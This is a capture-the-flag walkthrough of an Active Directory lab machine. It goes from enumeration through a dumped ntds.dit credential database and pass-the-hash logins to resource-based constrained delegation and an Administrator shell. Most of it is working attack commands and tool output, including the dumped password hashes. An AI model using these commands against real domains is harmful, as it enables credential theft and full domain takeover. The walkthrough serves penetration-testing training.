```nmap
nmap -sC -sV -Pn -oA resourced 192.168.55.175
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 20:55 CST
Nmap scan report for 192.168.55.175
Host is up (0.044s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-23 02:55:31Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-02-23T02:56:18+00:00; +19s from scanner time.
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2023-02-22T02:53:43
|_Not valid after:  2023-08-24T02:53:43
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-02-23T02:55:34+00:00
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 16s, deviation: 2s, median: 15s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-02-23T02:55:39
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.68 seconds
```
Starting off we run Enum4Linux as we see LDAP.
Enum4Linux
```sh
enum4linux 192.168.55.175 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Feb 22 22:12:35 2023

 =========================================( Target Information )=========================================
                                                                                                                    
Target ........... 192.168.55.175                                                                                   
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.55.175 )===========================
                                                                                                                    
                                                                                                                    
[E] Can't find workgroup/domain                                                                                     
                                                                                                                    
                                                                                                                    

 ===============================( Nbtstat Information for 192.168.55.175 )===============================
                                                                                                                    
Looking up status of 192.168.55.175                                                                                 
No reply from 192.168.55.175

 ==================================( Session Check on 192.168.55.175 )==================================
                                                                                                                    
                                                                                                                    
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.                      
                                                                                                                    
                                                                                                                    
┌──(kali㉿kali)-[~/OPG/resourced]
└─$ enum4linux 192.168.55.175
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Feb 22 22:15:15 2023

 =========================================( Target Information )=========================================
                                                                                                                    
Target ........... 192.168.55.175                                                                                   
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.55.175 )===========================
                                                                                                                    
                                                                                                                    
[E] Can't find workgroup/domain                                                                                     
                                                                                                                    
                                                                                                                    

 ===============================( Nbtstat Information for 192.168.55.175 )===============================
                                                                                                                    
Looking up status of 192.168.55.175                                                                                 
No reply from 192.168.55.175

 ==================================( Session Check on 192.168.55.175 )==================================
                                                                                                                    
                                                                                                                    
[+] Server 192.168.55.175 allows sessions using username '', password ''                                            
                                                                                                                    
                                                                                                                    
 ===============================( Getting domain SID for 192.168.55.175 )===============================
                                                                                                                    
Domain Name: resourced                                                                                              
Domain Sid: S-1-5-21-537427935-490066102-1511301751

[+] Host is part of a domain (not a workgroup)                                                                      
                                                                                                                    
                                                                                                                    
 ==================================( OS information on 192.168.55.175 )==================================
                                                                                                                    
                                                                                                                    
[E] Can't get OS info with smbclient                                                                                
                                                                                                                    
                                                                                                                    
[+] Got OS info for 192.168.55.175 from srvinfo:                                                                    
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                              


 ======================================( Users on 192.168.55.175 )======================================
                                                                                                                    
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[M.Mason] rid:[0x44f]
user:[K.Keen] rid:[0x450]
user:[L.Livingstone] rid:[0x451]
user:[J.Johnson] rid:[0x452]
user:[V.Ventz] rid:[0x453]
user:[S.Swanson] rid:[0x454]
user:[P.Parker] rid:[0x455]
user:[R.Robinson] rid:[0x456]
user:[D.Durant] rid:[0x457]
user:[G.Goldberg] rid:[0x458]

 ================================( Share Enumeration on 192.168.55.175 )================================
                                                                                                                    
do_connect: Connection to 192.168.55.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                           

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.55.175                                                                      
                                                                                                                    
                                                                                                                    
 ===========================( Password Policy Information for 192.168.55.175 )===========================
                                                                                                                    
                                                                                                                    

[+] Attaching to 192.168.55.175 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:192.168.55.175)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] resourced
        [+] Builtin

[+] Password Info for Domain: resourced

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: 41 days 23 hours 53 minutes 
        [+] Password Complexity Flags: 000001

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 1

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                
                                                                                                                    
                                                                                                                    
Password Complexity: Enabled                                                                                        
Minimum Password Length: 7


 ======================================( Groups on 192.168.55.175 )======================================
                                                                                                                    
                                                                                                                    
[+] Getting builtin groups:                                                                                         
                                                                                                                    
group:[Server Operators] rid:[0x225]                                                                                
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+]  Getting builtin group memberships:                                                                             
                                                                                                                    
Group: Remote Desktop Users' (RID: 555) has member: Couldn't lookup SIDs                                            
Group: Administrators' (RID: 544) has member: Couldn't lookup SIDs
Group: Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group: Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group: IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group: Users' (RID: 545) has member: Couldn't lookup SIDs
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group: Guests' (RID: 546) has member: Couldn't lookup SIDs

[+]  Getting local groups:                                                                                          
                                                                                                                    
group:[Cert Publishers] rid:[0x205]                                                                                 
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+]  Getting local group memberships:                                                                               
                                                                                                                    
Group: Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs                          

[+]  Getting domain groups:                                                                                         
                                                                                                                    
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                                                         
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]

[+]  Getting domain group memberships:                                                                              
                                                                                                                    
Group: 'Schema Admins' (RID: 518) has member: resourced\Administrator                                               
Group: 'Enterprise Admins' (RID: 519) has member: resourced\Administrator
Group: 'Domain Controllers' (RID: 516) has member: resourced\RESOURCEDC$
Group: 'Domain Users' (RID: 513) has member: resourced\Administrator
Group: 'Domain Users' (RID: 513) has member: resourced\krbtgt
Group: 'Domain Users' (RID: 513) has member: resourced\M.Mason
Group: 'Domain Users' (RID: 513) has member: resourced\K.Keen
Group: 'Domain Users' (RID: 513) has member: resourced\L.Livingstone
Group: 'Domain Users' (RID: 513) has member: resourced\J.Johnson
Group: 'Domain Users' (RID: 513) has member: resourced\V.Ventz
Group: 'Domain Users' (RID: 513) has member: resourced\S.Swanson
Group: 'Domain Users' (RID: 513) has member: resourced\P.Parker
Group: 'Domain Users' (RID: 513) has member: resourced\R.Robinson
Group: 'Domain Users' (RID: 513) has member: resourced\D.Durant
Group: 'Domain Users' (RID: 513) has member: resourced\G.Goldberg
Group: 'Domain Admins' (RID: 512) has member: resourced\Administrator
Group: 'Domain Guests' (RID: 514) has member: resourced\Guest
Group: 'Group Policy Creator Owners' (RID: 520) has member: resourced\Administrator

 =================( Users on 192.168.55.175 via RID cycling (RIDS: 500-550,1000-1050) )=================
                                                                                                                    
                                                                                                                    
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                           
                                                                                                                    
                                                                                                                    
 ==============================( Getting printer info for 192.168.55.175 )==============================
                                                                                                                    
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                             


enum4linux complete on Wed Feb 22 22:16:39 2023

```

Found credentials for a new hire:
v.ventz:HotelCalifornia194!

```sh
python ~/CrackMapExec/cme/crackmapexec.py smb 192.168.55.175 -u v.ventz -p 'HotelCalifornia194!' --shares
SMB         192.168.55.175  445    RESOURCEDC       [*] Windows 10.0 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.55.175  445    RESOURCEDC       [+] resourced.local\v.ventz:HotelCalifornia194! 
SMB         192.168.55.175  445    RESOURCEDC       [+] Enumerated shares
SMB         192.168.55.175  445    RESOURCEDC       Share           Permissions     Remark
SMB         192.168.55.175  445    RESOURCEDC       -----           -----------     ------
SMB         192.168.55.175  445    RESOURCEDC       ADMIN$                          Remote Admin
SMB         192.168.55.175  445    RESOURCEDC       C$                              Default share
SMB         192.168.55.175  445    RESOURCEDC       IPC$            READ            Remote IPC
SMB         192.168.55.175  445    RESOURCEDC       NETLOGON        READ            Logon server share 
SMB         192.168.55.175  445    RESOURCEDC       Password Audit  READ            
SMB         192.168.55.175  445    RESOURCEDC       SYSVOL          READ            Logon server share 

```
Connect with smbclient
```
smbclient '\\192.168.55.175\Password Audit' -U resourced.local\\v.ventz
```

Searched both folders and found ntds.dit which contains hashes. The security and system files are needed as well. Extracked the hashes.

```sh
impacket-secretsdump -ntds ntds.dit -security SECURITY -system SYSTEM LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:507fdb105d9322cf53420c95780adf5f2dcdac7ca14f8b37188370c916a3fa6f2a511bb284aeac71211c939a866a2b4cc02c408e1d242ad4f5cc8f7b85d2448c18d23fb47f7b9b543a6cfb8999e40037f23dbfd8690869753979d15fe61bdcddb0ccff3d20c275207ca93e844c3b5aa1f658198225b3e54f90e0b71aaf76ba32bb1b598d189b6696c27d04674fd4c4f2c09d0df2e59fe93850aa928be813be3bd659f0d2ecba6e34fb5a3880db8155cf77e21eb44d63e1ae65abcc2aa5bdfb6bfe85e8590329929522aae501ba86d8622918e37b41daef8a2b00e78440d13e88a31fc14714923bba6fb99e13c81b3020
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd
dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
[*] NL$KM 
 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.>.J......I.
 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..
NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
```

Started trying one by one for winrm crackmapexec.

```
python ~/CrackMapExec/cme/crackmapexec.py winrm 192.168.55.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
```
Connect using the hash
```
evil-winrm -i 192.168.55.175 -u l.livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
```
Upload and import Sharphound. Then run it to capture everything.
```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Import-Module ./SharpHound.ps1
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Invoke-Bloodhound -CollectionMethod All
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> dir
    Directory: C:\Users\L.Livingstone\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/23/2023   5:02 PM          11768 20230223170218_BloodHound.zip
-a----        2/23/2023   5:02 PM           8964 N2NkZDYyMzItY2UxZi00N2ZkLTg4ZmQtNThlNjJlZDQ1NzJh.bin
-a----        2/23/2023   4:50 PM        1318740 SharpHound.ps1

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> download 20230223170218_BloodHound.zip
Info: Downloading 20230223170218_BloodHound.zip to ./20230223170218_BloodHound.zip
```
Downloaded and imported
Found that l.livingstone has GenericAll permissions
![[Pasted image 20230223191853.png]]

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution

Kerberos Resource-based Constrained Delegation: Computer Object Takeover

For this we need to use the following tool:
https://github.com/tothi/rbcd-attack

Use impacket to add the computer. Make sure to use ':' before the hash or it will fail.
```sh
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.55.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
```
Use RBCD to give us the permission to impersonate.
```sh
python rbcd.py -dc-ip 192.168.55.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$
[*] Initializing LDAP connection to 192.168.55.175
[*] Using resourced\l.livingstone account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
[*] Delegation rights modified succesfully!
[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
                                                                      
```
Get the Kerberos key for administrator
```sh
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.55.175
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```
Export it to use it in psexec
```sh
export KRB5CCNAME=Administrator.ccache
```
Run impacket to get a shell.
```sh
impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.55.175
```
We now have administrator